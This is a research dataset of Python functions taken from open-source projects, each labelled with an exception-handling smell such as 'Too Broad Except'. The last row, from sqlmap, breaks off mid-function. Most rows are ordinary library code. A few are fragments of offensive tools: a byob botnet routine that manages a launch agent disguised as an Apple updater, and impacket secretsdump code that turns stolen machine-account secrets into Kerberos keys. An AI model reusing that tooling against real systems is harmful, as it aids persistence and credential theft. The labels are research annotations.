189,mlflow,/home/r4ph/desenv/phd/exception-miner/projects/py/mlflow/mlflow/system_metrics/system_metrics_monitor.py,start,"def start(self):
        """"""Start monitoring system metrics.""""""
        try:
            self._process = threading.Thread(
                target=self.monitor,
                daemon=True,
                name=""SystemMetricsMonitor"",
            )
            self._process.start()
            _logger.info(""Started monitoring system metrics."")
        except Exception as e:
            _logger.warning(f""Failed to start monitoring system metrics: {e}"")
            self._process = None",Too Broad Except,1
190,scapy,/home/r4ph/desenv/phd/exception-miner/projects/py/scapy/scapy/asn1/asn1.py,__setattr__,"def __setattr__(self, name, value):
        # type: (str, Any) -> None
        if isinstance(value, bytes):
            value = plain_str(value)

        if name == ""val"":
            formats = {
                10: ""%Y%m%d%H"",
                12: ""%Y%m%d%H%M"",
                14: ""%Y%m%d%H%M%S""
            }
            dt = None  # type: Optional[datetime]
            try:
                if value[-1] == ""Z"":
                    str, ofs = value[:-1], value[-1:]
                elif value[-5] in (""+"", ""-""):
                    str, ofs = value[:-5], value[-5:]
                elif isinstance(self, ASN1_UTC_TIME):
                    raise ValueError()
                else:
                    str, ofs = value, """"

                if isinstance(self, ASN1_UTC_TIME) and len(str) >= 10:
                    fmt = ""%y"" + formats[len(str) + 2][2:]
                elif str[-4] == ""."":
                    fmt = formats[len(str) - 4] + "".%f""
                else:
                    fmt = formats[len(str)]

                dt = datetime.strptime(str, fmt)
                if ofs == 'Z':
                    dt = dt.replace(tzinfo=timezone.utc)
                elif ofs:
                    sign = -1 if ofs[0] == ""-"" else 1
                    ofs = datetime.strptime(ofs[1:], ""%H%M"")
                    delta = timedelta(hours=ofs.hour * sign,
                                      minutes=ofs.minute * sign)
                    dt = dt.replace(tzinfo=timezone(delta))
            except Exception:
                dt = None

            pretty_time = None
            if dt is None:
                _nam = self.tag._asn1_obj.__name__[5:]
                _nam = _nam.lower().replace(""_"", "" "")
                pretty_time = ""%s [invalid %s]"" % (value, _nam)
            else:
                pretty_time = dt.strftime(""%Y-%m-%d %H:%M:%S"")
                if dt.microsecond:
                    pretty_time += dt.strftime("".%f"")[:4]
                if dt.tzinfo == timezone.utc:
                    pretty_time += dt.strftime("" UTC"")
                elif dt.tzinfo is not None:
                    if dt.tzinfo.utcoffset(dt) is not None:
                        pretty_time += dt.strftime("" %z"")

            ASN1_STRING.__setattr__(self, ""pretty_time"", pretty_time)
            ASN1_STRING.__setattr__(self, ""datetime"", dt)
            ASN1_STRING.__setattr__(self, name, value)
        elif name == ""pretty_time"":
            print(""Invalid operation: pretty_time rewriting is not supported."")
        elif name == ""datetime"":
            ASN1_STRING.__setattr__(self, name, value)
            if isinstance(value, datetime):
                yfmt = ""%y"" if isinstance(self, ASN1_UTC_TIME) else ""%Y""
                if value.microsecond:
                    str = value.strftime(yfmt + ""%m%d%H%M%S.%f"")[:-3]
                else:
                    str = value.strftime(yfmt + ""%m%d%H%M%S"")

                if value.tzinfo == timezone.utc:
                    str = str + ""Z""
                else:
                    str = str + value.strftime(""%z"")  # empty if naive

                ASN1_STRING.__setattr__(self, ""val"", str)
            else:
                ASN1_STRING.__setattr__(self, ""val"", None)
        else:
            ASN1_STRING.__setattr__(self, name, value)",Too Broad Except,1
191,pytest,/home/r4ph/desenv/phd/exception-miner/projects/py/pytest/src/_pytest/config/__init__.py,parse_warning_filter,"def parse_warning_filter(
    arg: str, *, escape: bool
) -> Tuple[""warnings._ActionKind"", str, Type[Warning], str, int]:
    """"""Parse a warnings filter string.

    This is copied from warnings._setoption with the following changes:

    * Does not apply the filter.
    * Escaping is optional.
    * Raises UsageError so we get nice error messages on failure.
    """"""
    __tracebackhide__ = True
    error_template = dedent(
        f""""""\
        while parsing the following warning configuration:

          {arg}

        This error occurred:

        {{error}}
        """"""
    )

    parts = arg.split("":"")
    if len(parts) > 5:
        doc_url = (
            ""https://docs.python.org/3/library/warnings.html#describing-warning-filters""
        )
        error = dedent(
            f""""""\
            Too many fields ({len(parts)}), expected at most 5 separated by colons:

              action:message:category:module:line

            For more information please consult: {doc_url}
            """"""
        )
        raise UsageError(error_template.format(error=error))

    while len(parts) < 5:
        parts.append("""")
    action_, message, category_, module, lineno_ = (s.strip() for s in parts)
    try:
        action: ""warnings._ActionKind"" = warnings._getaction(action_)  # type: ignore[attr-defined]
    except warnings._OptionError as e:
        raise UsageError(error_template.format(error=str(e)))
    try:
        category: Type[Warning] = _resolve_warning_category(category_)
    except Exception:
        exc_info = ExceptionInfo.from_current()
        exception_text = exc_info.getrepr(style=""native"")
        raise UsageError(error_template.format(error=exception_text))
    if message and escape:
        message = re.escape(message)
    if module and escape:
        module = re.escape(module) + r""\Z""
    if lineno_:
        try:
            lineno = int(lineno_)
            if lineno < 0:
                raise ValueError(""number is negative"")
        except ValueError as e:
            raise UsageError(
                error_template.format(error=f""invalid lineno {lineno_!r}: {e}"")
            )
    else:
        lineno = 0
    return action, message, category, module, lineno",Too Broad Except,1
192,openbbterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/openbbterminal/openbb_terminal/stocks/stocks_helper.py,check_datetime,"def check_datetime(
    ck_date: Optional[Union[datetime, str]] = None, start: bool = True
) -> datetime:
    """"""Check if given argument is string and attempts to convert to datetime.

    Parameters
    ----------
    ck_date : Optional[Union[datetime, str]], optional
        Date to check, by default None
    start : bool, optional
        If True and string is invalid, will return 1100 days ago
        If False and string is invalid, will return today, by default True

    Returns
    -------
    datetime
        Datetime object
    """"""
    error_catch = (datetime.now() - timedelta(days=1100)) if start else datetime.now()
    try:
        if ck_date is None:
            return error_catch
        if isinstance(ck_date, datetime):
            return ck_date
        if isinstance(ck_date, str):
            return datetime.strptime(ck_date, ""%Y-%m-%d"")
    except Exception:
        console.print(
            f""Invalid date format (YYYY-MM-DD), ""
            f""Using {error_catch.strftime('%Y-%m-%d')} for {ck_date}""
        )
    return error_catch",Too Broad Except,1
193,dgl,/home/r4ph/desenv/phd/exception-miner/projects/py/dgl/tests/distributed/test_partition.py,test_UnknownPartitionBook,"def test_UnknownPartitionBook():
    node_map = {""_N"": {0: 0, 1: 1, 2: 2}}
    edge_map = {""_N:_E:_N"": {0: 0, 1: 1, 2: 2}}

    part_metadata = {
        ""num_parts"": 1,
        ""num_nodes"": len(node_map),
        ""num_edges"": len(edge_map),
        ""node_map"": node_map,
        ""edge_map"": edge_map,
        ""graph_name"": ""test_graph"",
    }

    with tempfile.TemporaryDirectory() as test_dir:
        part_config = os.path.join(test_dir, ""test_graph.json"")
        with open(part_config, ""w"") as file:
            json.dump(part_metadata, file, indent=4)
        try:
            load_partition_book(part_config, 0)
        except Exception as e:
            if not isinstance(e, TypeError):
                raise e",Too Broad Except,1
194,byob,/home/r4ph/desenv/phd/exception-miner/projects/py/byob/web-gui/buildyourownbotnet/modules/persistence.py,_remove_launch_agent,"def _remove_launch_agent(value=None, name='com.apple.update.manager'):
    try:
        if _methods['launch_agent'].established:
            launch_agent = _methods['launch_agent'].result
            if os.path.isfile(launch_agent):
                util.delete(launch_agent)
                return (False, None)
    except Exception as e:
        util.log(""{} error: {}"".format(_remove_launch_agent.__name__, str(e)))
    return (_methods['launch_agent'].established, _methods['launch_agent'].result)",Too Broad Except,1
195,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/deltalm/fairseq/fairseq/model_parallel/megatron/openwebtext/make_gpt2_dataset.py,tokenize_corpus,"def tokenize_corpus(filename, np_filename, print_interval=10000):

    print(' > tokenizing {}'.format(filename))

    tokenizer = Tokenizer(cache_dir='./cache')

    tokenized_docs = []
    num_docs = 0
    num_tokens = 0
    start_time = time.time()
    with open(filename, 'r') as f:
        for line in f:
            try:
                myjson = json.loads(line)
                url = myjson['url']
                sample = myjson['text']
                tokens = tokenizer.tokenize_document(sample)
                tokenized_docs.append(np.array(tokens, dtype=np.uint16))
                num_docs += 1
                num_tokens += len(tokens)
                if num_docs % print_interval == 0:
                    print('    processed {:9d} documents in {:.2f} (s) so far'.
                          format(num_docs, time.time() - start_time),
                          flush=True)
            except Exception as e:
                print('    skipping ', line, e)

    print('  >> processed {} document with total of {} tokens ...'.format(
        num_docs, num_tokens))

    tokenized_docs = np.array(tokenized_docs, dtype=object)
    np.save(np_filename, tokenized_docs, allow_pickle=True)
    print('  >> saved the tokenzed document to {} ...'.format(np_filename))",Too Broad Except,1
196,fashion-mnist,/home/r4ph/desenv/phd/exception-miner/projects/py/fashion-mnist/benchmark/runner.py,_sanity_check,"def _sanity_check(self, all_tasks):
        total_clf = 0
        failed_clf = 0
        Xt, Yt = mnist_reader.load_mnist(path=DATA_DIR, kind='t10k')
        Xt = preprocessing.StandardScaler().fit_transform(Xt)
        Xs, Ys = shuffle(Xt, Yt)
        num_dummy = 10
        Xs = Xs[:num_dummy]
        Ys = [j for j in range(10)]
        valid_jobs = []
        for v in all_tasks:
            clf_name = list(v.keys())[0]
            clf_par = list(v.values())[0]
            total_clf += 1
            try:
                globals()[clf_name](**clf_par).fit(Xs, Ys)
                valid_jobs.append(PredictJob(clf_name, clf_par, self.num_repeat))
            except Exception as e:
                failed_clf += 1
                LOGGER.error('Can not create classifier ""%s"" with parameter ""%s"". Reason: %s' % (clf_name, clf_par, e))
        LOGGER.info('%d classifiers to test, %d fail to create!' % (total_clf, failed_clf))
        return valid_jobs",Too Broad Except,1
197,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/python/ray/serve/_private/deployment_state.py,check_ready,"def check_ready(self) -> Tuple[ReplicaStartupStatus, Optional[str]]:
        """"""
        Check if current replica has started by making ray API calls on
        relevant actor / object ref.

        Replica initialization calls __init__(), reconfigure(), and check_health().

        Returns:
            state (ReplicaStartupStatus):
                PENDING_ALLOCATION: replica is waiting for a worker to start
                PENDING_INITIALIZATION: replica initialization hasn't finished.
                FAILED: replica initialization failed.
                SUCCEEDED: replica initialization succeeded.
            error_msg:
                None: for PENDING_ALLOCATION, PENDING_INITIALIZATION or SUCCEEDED states
                str: for FAILED state
        """"""

        # Check whether the replica has been allocated.
        if self._allocated_obj_ref is None or not check_obj_ref_ready_nowait(
            self._allocated_obj_ref
        ):
            return ReplicaStartupStatus.PENDING_ALLOCATION, None

        if not self._is_cross_language:
            try:
                (
                    self._pid,
                    self._actor_id,
                    self._worker_id,
                    self._node_id,
                    self._node_ip,
                    self._log_file_path,
                ) = ray.get(self._allocated_obj_ref)
            except RayTaskError as e:
                logger.exception(
                    f""Exception in replica '{self._replica_tag}', ""
                    ""the replica will be stopped.""
                )
                return ReplicaStartupStatus.FAILED, str(e.as_instanceof_cause())
            except RuntimeEnvSetupError as e:
                msg = (
                    f""Exception when allocating replica '{self._replica_tag}': {str(e)}""
                )
                logger.exception(msg)
                return ReplicaStartupStatus.FAILED, msg
            except Exception:
                msg = (
                    f""Exception when allocating replica '{self._replica_tag}':\n""
                    + traceback.format_exc()
                )
                logger.exception(msg)
                return ReplicaStartupStatus.FAILED, msg

        # Check whether relica initialization has completed.
        replica_ready = check_obj_ref_ready_nowait(self._ready_obj_ref)
        # In case of deployment constructor failure, ray.get will help to
        # surface exception to each update() cycle.
        if not replica_ready:
            return ReplicaStartupStatus.PENDING_INITIALIZATION, None
        else:
            try:
                # TODO(simon): fully implement reconfigure for Java replicas.
                if self._is_cross_language:
                    return ReplicaStartupStatus.SUCCEEDED, None

                # todo: The replica's userconfig whitch java client created
                #  is different from the controller's userconfig
                if not self._deployment_is_cross_language:
                    # This should only update version if the replica is being recovered.
                    # If this is checking on a replica that is newly started, this
                    # should return a version that is identical to what's already stored
                    _, self._version = ray.get(self._ready_obj_ref)
            except RayTaskError as e:
                logger.exception(
                    f""Exception in replica '{self._replica_tag}', ""
                    ""the replica will be stopped.""
                )
                # NOTE(zcin): we should use str(e) instead of traceback.format_exc()
                # here because the full details of the error is not displayed properly
                # with traceback.format_exc().
                return ReplicaStartupStatus.FAILED, str(e.as_instanceof_cause())
            except Exception as e:
                logger.exception(
                    f""Exception in replica '{self._replica_tag}', ""
                    ""the replica will be stopped.""
                )
                return ReplicaStartupStatus.FAILED, repr(e)

        return ReplicaStartupStatus.SUCCEEDED, None",Too Broad Except,1
198,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/galaxy/collection/galaxy_api_proxy.py,get_collection_version_metadata,"def get_collection_version_metadata(self, collection_candidate):
        # type: (Candidate) -> CollectionVersionMetadata
        """"""Retrieve collection metadata of a given candidate.""""""
        self._assert_that_offline_mode_is_not_requested()

        api_lookup_order = (
            (collection_candidate.src, )
            if isinstance(collection_candidate.src, GalaxyAPI)
            else self._apis
        )

        last_err: t.Optional[Exception]

        for api in api_lookup_order:
            try:
                version_metadata = api.get_collection_version_metadata(
                    collection_candidate.namespace,
                    collection_candidate.name,
                    collection_candidate.ver,
                )
            except GalaxyError as api_err:
                last_err = api_err
            except Exception as unknown_err:
                # `verify` doesn't use `get_collection_versions` since the version is already known.
                # Do the same as `install` and `download` by trying all APIs before failing.
                # Warn for debugging purposes, since the Galaxy server may be unexpectedly down.
                last_err = unknown_err
                display.warning(
                    ""Skipping Galaxy server {server!s}. ""
                    ""Got an unexpected error when getting ""
                    ""available versions of collection {fqcn!s}: {err!s}"".
                    format(
                        server=api.api_server,
                        fqcn=collection_candidate.fqcn,
                        err=to_text(unknown_err),
                    )
                )
            else:
                self._concrete_art_mgr.save_collection_source(
                    collection_candidate,
                    version_metadata.download_url,
                    version_metadata.artifact_sha256,
                    api.token,
                    version_metadata.signatures_url,
                    version_metadata.signatures,
                )
                return version_metadata

        raise last_err",Too Broad Except,1
199,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/srv/pool.py,stop,"def stop(self, wait_till):
        for w in self.workers:
            if w.is_alive():
                try:
                    w.plugin.stop()
                except Exception:
                    self.loop.log.exception('Failed to stop plugin:', self.plugin_name(w.plugin))
        for w in self.workers:
            left = wait_till - monotonic()
            if left > 0:
                w.join(left)
            else:
                break
        self.workers = [w for w in self.workers if w.is_alive()]",Too Broad Except,1
200,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/impacket/examples/secretsdump.py,__printMachineKerberos,"def __printMachineKerberos(self, rawsecret, machinename):
        # Attempt to create Kerberos keys from machine account (if possible)
        if hasattr(self.__remoteOps, 'getMachineKerberosSalt'):
            salt = self.__remoteOps.getMachineKerberosSalt()
            if salt == b'':
                return False
            else:
                allciphers = [
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.des_cbc_md5.value)
                ]
                # Ok, so the machine account password is in raw UTF-16, BUT can contain any amount
                # of invalid unicode characters.
                # This took me (Dirk-jan) way too long to figure out, but apparently Microsoft
                # implicitly replaces those when converting utf-16 to utf-8.
                # When we use the same method we get the valid password -> key mapping :)
                rawsecret = rawsecret.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
                for etype in allciphers:
                    try:
                        key = string_to_key(etype, rawsecret, salt, None)
                    except Exception:
                        LOG.debug('Exception', exc_info=True)
                        raise
                    typename = NTDSHashes.KERBEROS_TYPE[etype]
                    secret = ""%s:%s:%s"" % (machinename, typename, hexlify(key.contents).decode('utf-8'))
                    self.__secretItems.append(secret)
                    self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_KERBEROS, secret)
                return True
        else:
            return False",Too Broad Except,1
201,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/server/cluster.py,_wait_for_server,"async def _wait_for_server(
        self,
        timeout: float = 30.0,
        status_sock: Optional[socket.socket] = None,
    ) -> None:

        async def _read_server_status(
            stream: asyncio.StreamReader,
        ) -> Dict[str, Any]:
            while True:
                line = await stream.readline()
                if not line:
                    raise ClusterError(""EdgeDB server terminated"")
                if line.startswith(b'READY='):
                    break

            _, _, dataline = line.decode().partition('=')
            try:
                return json.loads(dataline)  # type: ignore
            except Exception as e:
                raise ClusterError(
                    f""EdgeDB server returned invalid status line: ""
                    f""{dataline!r} ({e})""
                )

        async def test() -> None:
            stat_reader, stat_writer = await asyncio.open_connection(
                sock=status_sock,
            )
            try:
                data = await asyncio.wait_for(
                    _read_server_status(stat_reader),
                    timeout=timeout
                )
            except asyncio.TimeoutError:
                raise ClusterError(
                    f'EdgeDB server did not initialize '
                    f'within {timeout} seconds'
                ) from None

            self._effective_port = data['port']
            self._tls_cert_file = data['tls_cert_file']
            stat_writer.close()

        left = timeout
        if status_sock is not None:
            started = time.monotonic()
            await test()
            left -= (time.monotonic() - started)

        if self._admin_query(""SELECT ();"", f""{max(1, int(left))}s""):
            raise ClusterError(
                f'could not connect to edgedb-server '
                f'within {timeout} seconds') from None",Too Broad Except,1
202,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.6/archivebox/search/__init__.py,query_search_index,"def query_search_index(query: str, out_dir: Path=OUTPUT_DIR) -> QuerySet:
    from core.models import Snapshot

    if search_backend_enabled():
        backend = import_backend()
        try:
            snapshot_ids = backend.search(query)
        except Exception as err:
            stderr()
            stderr(
                    f'[X] The search backend threw an exception={err}:',
                color='red',
                )
            raise
        else:
            # TODO preserve ordering from backend
            qsearch = Snapshot.objects.filter(pk__in=snapshot_ids)
            return qsearch
    
    return Snapshot.objects.none()",Too Broad Except,1
203,pysyft,/home/r4ph/desenv/phd/exception-miner/projects/py/pysyft/packages/syft/src/syft/service/action/action_object.py,_syft_wrap_attribute_for_methods,"def _syft_wrap_attribute_for_methods(self, name: str) -> Any:
        """"""Handle `__getattribute__` for methods.""""""

        # check for other types that aren't methods, functions etc
        def fake_func(*args: Any, **kwargs: Any) -> Any:
            return ActionDataEmpty(syft_internal_type=self.syft_internal_type)

        debug(f""[__getattribute__] Handling method {name} "")
        if (
            issubclass(self.syft_action_data_type, ActionDataEmpty)
            and name not in action_data_empty_must_run
        ):
            original_func = fake_func
        else:
            original_func = getattr(self.syft_action_data, name)

        debug_original_func(name, original_func)

        def _base_wrapper(*args: Any, **kwargs: Any) -> Any:
            context = PreHookContext(
                obj=self,
                op_name=name,
                action_type=ActionType.METHOD,
                syft_node_location=self.syft_node_location,
                syft_client_verify_key=self.syft_client_verify_key,
            )
            context, pre_hook_args, pre_hook_kwargs = self._syft_run_pre_hooks__(
                context, name, args, kwargs
            )

            if has_action_data_empty(args=args, kwargs=kwargs):
                result = fake_func(*args, **kwargs)
            else:
                original_args, original_kwargs = debox_args_and_kwargs(
                    pre_hook_args, pre_hook_kwargs
                )
                result = original_func(*original_args, **original_kwargs)

            post_result = self._syft_run_post_hooks__(context, name, result)
            post_result = self._syft_attr_propagate_ids(context, name, post_result)

            return post_result

        if inspect.ismethod(original_func) or inspect.ismethoddescriptor(original_func):
            debug(""Running method: "", name)

            def wrapper(_self: Any, *args: Any, **kwargs: Any):
                return _base_wrapper(*args, **kwargs)

            wrapper = types.MethodType(wrapper, type(self))
        else:
            debug(""Running non-method: "", name)

            wrapper = _base_wrapper

        try:
            wrapper.__doc__ = original_func.__doc__
            debug(
                ""Found original signature for "",
                name,
                inspect.signature(original_func),
            )
            wrapper.__ipython_inspector_signature_override__ = inspect.signature(
                original_func
            )
        except Exception:
            debug(""name"", name, ""has no signature"")

        # third party
        return wrapper",Too Broad Except,1
204,mlflow,/home/r4ph/desenv/phd/exception-miner/projects/py/mlflow/mlflow/store/db/utils.py,create_sqlalchemy_engine_with_retry,"def create_sqlalchemy_engine_with_retry(db_uri):
    attempts = 0
    while True:
        attempts += 1
        engine = create_sqlalchemy_engine(db_uri)
        try:
            sqlalchemy.inspect(engine)
            return engine
        except Exception as e:
            if attempts < MAX_RETRY_COUNT:
                sleep_duration = 0.1 * ((2**attempts) - 1)
                _logger.warning(
                    ""SQLAlchemy engine could not be created. The following exception is caught.\n""
                    ""%s\nOperation will be retried in %.1f seconds"",
                    e,
                    sleep_duration,
                )
                time.sleep(sleep_duration)
                continue
            raise",Too Broad Except,1
205,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/services/awslambda/lambda_api.py,_serve_flask_app,"def _serve_flask_app(app, port, host=None, cors=True, asynchronous=False):
    if cors:
        CORS(app)
    if not config.DEBUG:
        logging.getLogger(""werkzeug"").setLevel(logging.ERROR)
    if not host:
        host = ""0.0.0.0""
    ssl_context = None
    if not config.FORWARD_EDGE_INMEM and config.USE_SSL:
        _, cert_file_name, key_file_name = create_ssl_cert(serial_number=port)
        ssl_context = cert_file_name, key_file_name
    app.config[""ENV""] = ""development""

    def noecho(*args, **kwargs):
        pass

    try:
        import click

        click.echo = noecho
    except Exception:
        pass

    def _run(*_):
        app.run(port=int(port), threaded=True, host=host, ssl_context=ssl_context)
        return app

    if asynchronous:
        return start_thread(_run, name=""flaskapp"")
    return _run()",Too Broad Except,1
206,awx,/home/r4ph/desenv/phd/exception-miner/projects/py/awx/awx/main/tests/functional/conftest.py,group_factory,"def group_factory(inventory):
    def g(name):
        try:
            return Group.objects.get(name=name, inventory=inventory)
        except Exception:
            return Group.objects.create(inventory=inventory, name=name)

    return g",Too Broad Except,1
207,numpy,/home/r4ph/desenv/exception-miner/projects/py/numpy/numpy/distutils/ccompiler.py,CCompiler_show_customization,"def CCompiler_show_customization(self):
    """"""
    Print the compiler customizations to stdout.

    Parameters
    ----------
    None

    Returns
    -------
    None

    Notes
    -----
    Printing is only done if the distutils log threshold is < 2.

    """"""
    try:
        self.get_version()
    except Exception:
        pass
    if log._global_log.threshold<2:
        print('*'*80)
        print(self.__class__)
        print(_compiler_to_string(self))
        print('*'*80)",Too Broad Except,1
208,gamestonkterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/gamestonkterminal/openbb_terminal/mutual_funds/mstarpy_model.py,get_historical,"def get_historical(
    loaded_funds: mstarpy.Funds,
    start_date: str,
    end_date: str,
    comparison: str = """",
) -> pd.DataFrame:
    """"""Get historical fund, category, index price

    Parameters
    ----------
    loaded_funds: mstarpy.Funds
        class mstarpy.Funds instantiated with selected funds
    start_date: str
        start date of the historical data
    end_date: str
        end date of the historical data
    comparison: str
        can be index, category, both

    Returns
    -------
    pd.DataFrame
        Dataframe containing historical data

    Examples
    --------
    >>> from openbb_terminal.sdk import openbb
    >>> f = openbb.funds.load(""Vanguard"", ""US"")
    >>> openbb.funds.historical(f, ""2020-01-01"", ""2020-12-31"")
    """"""
    try:
        start_date_dt = pd.to_datetime(start_date)
        end_date_dt = pd.to_datetime(end_date)
        if not comparison:
            data = loaded_funds.nav(start_date_dt, end_date_dt, frequency=""daily"")
            df = pd.DataFrame(data).set_index(""date"")
            df.index = pd.to_datetime(df.index)
        else:
            comparison_list = {
                ""index"": [
                    ""fund"",
                    ""index"",
                ],
                ""category"": [""fund"", ""category""],
                ""both"": [""fund"", ""index"", ""category""],
            }
            data = loaded_funds.historicalData()
            df_dict = {}
            for x in comparison_list[comparison]:
                df_dict[x] = pd.DataFrame(data[""graphData""][x]).set_index(""date"")

            df = pd.concat(
                list(df_dict.values())[:], axis=1, keys=list(df_dict.keys())[:]
            )
            df.index = pd.to_datetime(df.index)
            df = df.loc[(df.index >= start_date_dt) & (df.index <= end_date_dt)]
            df = (df.pct_change().fillna(0) + 1).cumprod() * 100
            df.columns = [col[0] for col in df.columns]
    except Exception as e:
        console.print(f""Error: {e}"")
        return pd.DataFrame()
    return df",Too Broad Except,1
209,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/template/__init__.py,__getitem__,"def __getitem__(self, key):

        if not isinstance(key, string_types):
            raise ValueError('key must be a string, got %s instead' % type(key))

        original_exc = None
        if key not in self._loaded_builtins:
            plugin = None
            try:
                plugin = self._pluginloader.get(key)
            except (AnsibleError, KeyError) as e:
                original_exc = e
            except Exception as e:
                display.vvvv('Unexpected plugin load (%s) exception: %s' % (key, to_native(e)))
                raise e

            # if a plugin was found/loaded
            if plugin:
                # set in filter cache and avoid expensive plugin load
                self._delegatee[key] = plugin.j2_function
                self._loaded_builtins.add(key)

        # raise template syntax error if we could not find ours or jinja2 one
        try:
            func = self._delegatee[key]
        except KeyError as e:
            raise TemplateSyntaxError('Could not load ""%s"": %s' % (key, to_native(original_exc or e)), 0)

        # if i do have func and it is a filter, it nees wrapping
        if self._pluginloader.type == 'filter':
            # filter need wrapping
            if key in C.STRING_TYPE_FILTERS:
                # avoid litera_eval when you WANT strings
                func = _wrap_native_text(func)
            else:
                # conditionally unroll iterators/generators to avoid having to use `|list` after every filter
                func = _unroll_iterator(func)

        return func",Too Broad Except,1
210,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tdx.py,QA_SU_save_etf_list,"def QA_SU_save_etf_list(client=DATABASE, ui_log=None, ui_progress=None):
    """"""save etf_list

    Keyword Arguments:
        client {[type]} -- [description] (default: {DATABASE})
    """"""
    try:
        QA_util_log_info(
            '##JOB16 Now Saving ETF_LIST ====',
            ui_log=ui_log,
            ui_progress=ui_progress,
            ui_progress_int_value=5000
        )
        etf_list_from_tdx = QA_fetch_get_stock_list(type_=""etf"")
        pandas_data = QA_util_to_json_from_pandas(etf_list_from_tdx)

        if len(pandas_data) > 0:
            # 获取到数据后才进行drop collection 操作
            client.drop_collection('etf_list')
            coll = client.etf_list
            coll.create_index('code')
            coll.insert_many(pandas_data)
        QA_util_log_info(
            ""完成ETF列表获取"",
            ui_log=ui_log,
            ui_progress=ui_progress,
            ui_progress_int_value=10000
        )
    except Exception as e:
        QA_util_log_info(e, ui_log=ui_log)
        print("" Error save_tdx.QA_SU_save_etf_list exception!"")
        pass",Too Broad Except,1
211,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/plugins/filter/core.py,randomize_list,"def randomize_list(mylist, seed=None):
    try:
        mylist = list(mylist)
        if seed:
            r = Random(seed)
            r.shuffle(mylist)
        else:
            shuffle(mylist)
    except Exception:
        pass
    return mylist",Too Broad Except,1
212,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/archivebox/extractors/__init__.py,archive_link,"def archive_link(link: Link, overwrite: bool=False, methods: Optional[Iterable[str]]=None, out_dir: Optional[Path]=None) -> Link:
    """"""download the DOM, PDF, and a screenshot into a folder named after the link's timestamp""""""

    # TODO: Remove when the input is changed to be a snapshot. Suboptimal approach.
    from core.models import Snapshot, ArchiveResult
    try:
        snapshot = Snapshot.objects.get(url=link.url) # TODO: This will be unnecessary once everything is a snapshot
    except Snapshot.DoesNotExist:
        snapshot = write_link_to_sql_index(link)

    ARCHIVE_METHODS = get_default_archive_methods()
    
    if methods:
        ARCHIVE_METHODS = [
            method for method in ARCHIVE_METHODS
            if method[0] in methods
        ]

    out_dir = out_dir or Path(link.link_dir)
    try:
        is_new = not Path(out_dir).exists()
        if is_new:
            os.makedirs(out_dir)

        link = load_link_details(link, out_dir=out_dir)
        write_link_details(link, out_dir=out_dir, skip_sql_index=False)
        log_link_archiving_started(link, out_dir, is_new)
        link = link.overwrite(updated=datetime.now(timezone.utc))
        stats = {'skipped': 0, 'succeeded': 0, 'failed': 0}
        start_ts = datetime.now(timezone.utc)

        for method_name, should_run, method_function in ARCHIVE_METHODS:
            try:
                if method_name not in link.history:
                    link.history[method_name] = []

                if should_run(link, out_dir, overwrite):
                    log_archive_method_started(method_name)

                    result = method_function(link=link, out_dir=out_dir)

                    link.history[method_name].append(result)

                    stats[result.status] += 1
                    log_archive_method_finished(result)
                    write_search_index(link=link, texts=result.index_texts)
                    ArchiveResult.objects.create(snapshot=snapshot, extractor=method_name, cmd=result.cmd, cmd_version=result.cmd_version,
                                                 output=result.output, pwd=result.pwd, start_ts=result.start_ts, end_ts=result.end_ts, status=result.status)


                    # bump the updated time on the main Snapshot here, this is critical
                    # to be able to cache summaries of the ArchiveResults for a given
                    # snapshot without having to load all the results from the DB each time.
                    # (we use {Snapshot.id}-{Snapshot.updated} as the cache key and assume
                    # ArchiveResults are unchanged as long as the updated timestamp is unchanged)
                    snapshot.save()
                else:
                    # print('{black}      X {}{reset}'.format(method_name, **ANSI))
                    stats['skipped'] += 1
            except Exception as e:
                # Disabled until https://github.com/ArchiveBox/ArchiveBox/issues/984
                # and https://github.com/ArchiveBox/ArchiveBox/issues/1014
                # are fixed.
                """"""
                raise Exception('Exception in archive_methods.save_{}(Link(url={}))'.format(
                    method_name,
                    link.url,
                )) from e
                """"""
                # Instead, use the kludgy workaround from
                # https://github.com/ArchiveBox/ArchiveBox/issues/984#issuecomment-1150541627
                with open(ERROR_LOG, ""a"", encoding='utf-8') as f:
                    command = ' '.join(sys.argv)
                    ts = datetime.now(timezone.utc).strftime('%Y-%m-%d__%H:%M:%S')
                    f.write((""\n"" + 'Exception in archive_methods.save_{}(Link(url={})) command={}; ts={}'.format(
                        method_name,
                        link.url,
                        command,
                        ts
                    ) + ""\n""))
                    #f.write(f""\n> {command}; ts={ts} version={config['VERSION']} docker={config['IN_DOCKER']} is_tty={config['IS_TTY']}\n"")

        # print('    ', stats)

        try:
            latest_title = link.history['title'][-1].output.strip()
            if latest_title and len(latest_title) >= len(link.title or ''):
                link = link.overwrite(title=latest_title)
        except Exception:
            pass

        write_link_details(link, out_dir=out_dir, skip_sql_index=False)

        log_link_archiving_finished(link, out_dir, is_new, stats, start_ts)

    except KeyboardInterrupt:
        try:
            write_link_details(link, out_dir=link.link_dir)
        except:
            pass
        raise

    except Exception as err:
        print('    ! Failed to archive link: {}: {}'.format(err.__class__.__name__, err))
        raise

    return link",Nested Try-Except Blocks,1
213,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/lib/request/connect.py,getPage,"def getPage(**kwargs):
        """"""
        This method connects to the target URL or proxy and returns
        the target URL page content
        """"""

        if conf.offline:
            return None, None, None

        url = kwargs.get(""url"", None) or conf.url
        get = kwargs.get(""get"", None)
